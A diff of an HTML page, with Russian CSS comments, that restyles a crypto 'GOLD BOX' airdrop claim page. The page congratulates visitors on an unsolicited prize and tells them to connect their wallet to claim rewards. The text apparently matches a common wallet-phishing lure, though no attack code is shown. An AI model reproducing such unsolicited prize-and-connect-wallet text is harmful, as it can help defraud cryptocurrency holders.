@@ -32,8 +32,10 @@
             50% { transform: translateY(-10px); }
         }
 
-        .congratulations, .gold-box, .the-story, .hard-cap, .holders {
+        .congratulations {
             margin: 20px 0;
+            font-size: 48px; /* Увеличенный размер шрифта */
+            color: white;
         }
 
         .gold-box {
@@ -42,25 +44,36 @@
         }
 
         .how-to-claim {
-            color: white;
-            font-size: 20px; /* Больший размер шрифта */
+            color: gray;
+            margin: 10px 0; /* Уменьшенный отступ */
         }
 
         .list-item {
-            background-color: #d2a106; /* Более темный желтый */
+            background-color: yellow;
             color: black;
             display: inline-block;
-            padding: 5px 10px;
+            padding: 3px 6px; /* Уменьшенные паддинги */
             border-radius: 50%;
-            margin-right: 5px;
-            font-weight: bold; /* Жирный шрифт для цифр */
-            font-size: 16px; /* Размер шрифта для элементов списка */
+            margin: 5px; /* Минимальные отступы */
+            font-size: 16px;
+        }
+
+        .the-story {
+            margin-top: 20px; /* Стандартный отступ сверху */
         }
 
         .bottom-info {
             display: flex;
             justify-content: space-between;
             padding: 0 50px;
+        }
+
+        .hard-cap {
+            text-align: left; /* Выравнивание влево */
+        }
+
+        .holders {
+            text-align: right; /* Выравнивание вправо */
         }
     </style>
 </head>
@@ -74,7 +87,6 @@
         <img src="https://i.postimg.cc/RhY3ZVbM/ball.jpg" alt="Floating Ball" class="floating-image">
         <div class="congratulations">Congratulations, you've received a</div>
         <div class="gold-box">GOLD BOX</div>
-        <!-- Placeholder for web3 wallet integration -->
         <div class="how-to-claim">
             HOW TO CLAIM
             <div><span class="list-item">1</span> To claim rewards, connect your wallet to the AirDrop platform.</div>
@@ -83,7 +95,7 @@
         </div>
         <div class="the-story">
             THE STORY
-            <p>Here is the story of the Gold Box...</p>
+            <p>2557 participants supported ANON Upgrade tokenomics and received ANON Passes and ANON Boxes as the most valuable early adopters who will enjoy benefits across all of our products.</p>
         </div>
         <div class="bottom-info">
             <div class="hard-cap">HARD CAP $1M</div>
